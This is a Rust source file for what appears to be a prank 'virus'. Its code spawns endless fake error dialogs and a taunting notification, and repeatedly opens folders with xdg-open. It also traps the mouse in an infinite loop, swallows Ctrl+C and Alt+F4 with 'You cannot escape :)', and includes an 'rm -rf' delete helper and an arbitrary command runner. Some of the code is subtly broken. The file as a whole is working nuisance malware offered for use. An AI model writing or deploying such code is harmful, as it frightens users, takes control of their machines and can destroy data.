#[warn(unused_imports)]
use autopilot;
use autopilot::mouse::Button::Left;
use dialog::DialogBox;
use tts_rust::text_speech;
use notify_rust::Notification;
use rand;
use rand::seq::SliceRandom;
use rand::Rng;
use std::io::{stdin, stdout, Write};
use std::process::Command;
use std::{thread, time};
use termion::event::Key;
use termion::input::TermRead;
use termion::raw::IntoRawMode;
pub struct Clov;

impl Clov {

    pub fn command(cmdl: &str, arg: &str) {
        let cmd = Command::new(&cmdl)
            .arg(&arg)
            .output()
            .expect("Failed to execute command");
        println!("{}", std::str::from_utf8(&cmd.stdout).unwrap());
    }
    pub fn delete(file: &str) {
        let cmd = Command::new("rm")
            .args(vec!["-rf", file])
            .output()
            .expect("Failed to execute command");
        println!("{}", std::str::from_utf8(&cmd.stderr).unwrap());
    }
    pub fn fake_bytes() {
        for _y in 1..40 {
            let add_virus = vec!["remove: ", "Add: "];
            let millis = time::Duration::from_millis(10);
            let x86bom = rand::thread_rng().gen_range(0..2);
            println!(
                "{}{}",
                add_virus.choose(&mut rand::thread_rng()).unwrap(),
                x86bom
            );
            thread::sleep(millis);
        }
    }
    // unwanted_files
    pub fn unwanted_tts() {
        text_speech("G R R R R R R R R R R R R R R R R R R R R R R R R R R R R R Rvv R R R R R R R R R R R R R R R R R R R R R R R R R R R R R R");
    }
    pub fn unwanted_files(name: &str, name2: &str) {
        for _z in 1..10 {
            let millis = time::Duration::from_millis(10000);
            let cmd1 = Command::new("xdg-open")
                .arg(&name)
                .output()
                .expect("Failed to execute command");
            println!("{}", std::str::from_utf8(&cmd1.stdout).unwrap());
            let cmd2 = Command::new("xdg-open")
                .arg(&name2)
                .output()
                .expect("Failed to execute command");
            println!("{}", std::str::from_utf8(&cmd2.stdout).unwrap());
            thread::sleep(millis)
        }
    }
    pub fn create_files(name: &str) {
        let cmd = Command::new("touch")
            .arg(&name)
            .output()
            .expect("Failed to execute command");
        println!("{}", std::str::from_utf8(&cmd.stdout).unwrap());
    }

    pub fn call_df() {
        loop {
            pub fn key_not_allowed() {
                let stdin = stdin();
                let mut stdout = stdout().into_raw_mode().unwrap();
                stdout.flush().unwrap();
                sine_mouse_wave();
                for c in stdin.keys() {
                    //i reckon this speaks for itself
                    match c.unwrap() {
                        Key::Ctrl('h') => println!("Hello world!"),
                        // debug
                        Key::Ctrl('q') => break,
                        Key::Ctrl('c') => println!("You cannot escape :)"),
                        Key::Alt(F4) => println!("You cannot escape :)"),
                        Key::Alt('t') => println!("termion is cool"),
                        _ => (),
                    }

                    stdout.flush().unwrap();
                }
            }

            #[warn(unused_must_use)]
            #[warn(unused_imports)]
            let mut a = dialog::Question::new("window process exited eith code: 9_972");
            let mut b = dialog::Message::new("window process exited eith code: 9_970");
            let mut c = dialog::Message::new("window process exited eith code: 9_973");
            a.title("[X] ERROR");
            b.title("[X] s");
            c.title("[x] e");
            let asycl = thread::spawn(move || {
                a.show();
            });
            let asycl2 = thread::spawn(move || {
                b.show();
            });
            let asycl3 = thread::spawn(move || {
                c.show();
            });
            let asycl4 = thread::spawn(move || {
                Clov::unwanted_files(".", "..");
            });
            let asycl5 = thread::spawn(move || {
                Notification::new()
                    .summary("Xsys_err")
                    .body("You have executed the evil lololol")
                    .icon("error")
                    .show()
                    .expect("ERROR HAS BEEN PERFORMED!");
            });
            let asycl6 = thread::spawn(move || {
                key_not_allowed();
            });
            let asycl7 = thread::spawn(move || {
                let cmd = Command::new("mkdir")
                    .arg("CLV_VIRUS")
                    .output()
                    .expect("Failed to execute command");
                println!("{}", std::str::from_utf8(&cmd.stdout).unwrap());
            });

            asycl.join().unwrap();
            asycl2.join().unwrap();
            asycl3.join().unwrap();
            asycl4.join().unwrap();
            asycl5.join().unwrap();
            asycl6.join().unwrap();
            asycl7.join().unwrap();
        }
    }
}

pub fn sine_mouse_wave() {
    loop {
        autopilot::mouse::smooth_move(autopilot::geometry::Point::new(100.0, 200.0), Some(5.0))
            .expect("Unable to move mouse");
    }
    autopilot::mouse::click(autopilot::mouse::Button::Left, Some(10));
}
